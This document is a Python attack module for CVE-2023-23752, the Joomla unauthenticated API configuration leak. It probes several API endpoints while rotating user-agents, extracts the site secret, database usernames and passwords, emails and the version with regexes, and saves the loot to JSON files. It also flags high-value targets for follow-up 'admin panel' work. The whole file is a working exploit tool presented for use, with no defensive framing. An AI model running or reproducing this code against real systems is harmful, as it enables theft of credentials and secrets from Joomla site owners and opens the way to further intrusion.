# MINC - CVE-2023-23752 (Joomla Unauthenticated API Config Leak – Sophisticated Exploit-Aware Version)

import requests
import os
import json
from datetime import datetime
import re

TARGET_PATHS = [
    "/api/index.php/v1/config/application",
    "/api/v1/system/settings",
    "/joomla/api/index.php/v1/config",
    "/administrator/api/index.php/v1/config/application"
]

HEADERS_ROTATION = [
    {"User-Agent": "Mozilla/5.0 (AlienDrop/CVE23752a)"},
    {"User-Agent": "curl/8.0"},
    {"User-Agent": "Mozilla/5.0", "Accept": "*/*"},
    {"User-Agent": "AlienDrop/ScanLogic"}
]

PATTERNS = {
    "joomla_config": re.compile(r'"offline_message"\s*:\s*".+?"', re.I),
    "site_keys": re.compile(r'"secret"\s*:\s*".+?"', re.I),
    "db_creds": re.compile(r'"(user|username|db_user|password|pass)"\s*:\s*".+?"', re.I),
    "email": re.compile(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+"),
    "version": re.compile(r"\"version\"\s*:\s*\"(\d+\.\d+\.\d+)\"", re.I),
    "url_hint": re.compile(r"https?://[^\s\"']+", re.I)
}


def classify_joomla_leak(text):
    results = {}
    for key, regex in PATTERNS.items():
        matches = regex.findall(text)
        if matches:
            results[key] = list(set(matches))
    return results


def extract_key_value_pairs(text):
    found = {}
    lines = text.splitlines()
    for line in lines:
        kv = re.findall(r'"(\w+)"\s*:\s*"(.+?)"', line)
        for k, v in kv:
            found[k.strip()] = v.strip()
    return found


def save_leak_log(target, data):
    os.makedirs("output/leaks", exist_ok=True)
    with open(f"output/leaks/{target}_joomla_api.json", "w") as f:
        json.dump(data, f, indent=2)


def run(target):
    print(f"[CVE-23752] Probing {target} for exposed Joomla API config...")

    results = {}
    task_suggestions = []
    flags = []
    signals = {}

    for path in TARGET_PATHS:
        url = f"http://{target}{path}"
        headers = HEADERS_ROTATION[len(path) % len(HEADERS_ROTATION)]

        try:
            r = requests.get(url, headers=headers, timeout=4)

            if r.status_code == 200 and "offline_message" in r.text:
                snippet = r.text[:1500]
                classification = classify_joomla_leak(snippet)
                keyvals = extract_key_value_pairs(snippet)

                print(f"[CVE-23752] Config exposed at {path} → {', '.join(classification.keys()) or 'untyped'}")

                results[path] = {
                    "sample": snippet[:200].splitlines()[0],
                    "classified": classification,
                    "keyvals": keyvals
                }

                if "site_keys" in classification or "db_creds" in classification:
                    flags.append("exploit_priority")
                    task_suggestions.append("admin_panel_map")

                if "version" in classification:
                    signals["joomla_version"] = classification["version"][0]

                if "email" in classification:
                    flags.append("has_email_enums")

                if "url_hint" in classification:
                    flags.append("has_url_targets")

        except Exception:
            continue

    if results:
        leak_data = {
            "target": target,
            "timestamp": datetime.utcnow().isoformat(),
            "leaks": results,
            "status": "vulnerable",
            "flags": list(set(flags)),
            "signals": signals,
            "suggested_tasks": list(set(task_suggestions))
        }
        save_leak_log(target, leak_data)
        return leak_data

    print("[CVE-23752] No vulnerable API endpoints found.")
    return {
        "target": target,
        "leaks": {},
        "status": "clean"
    }

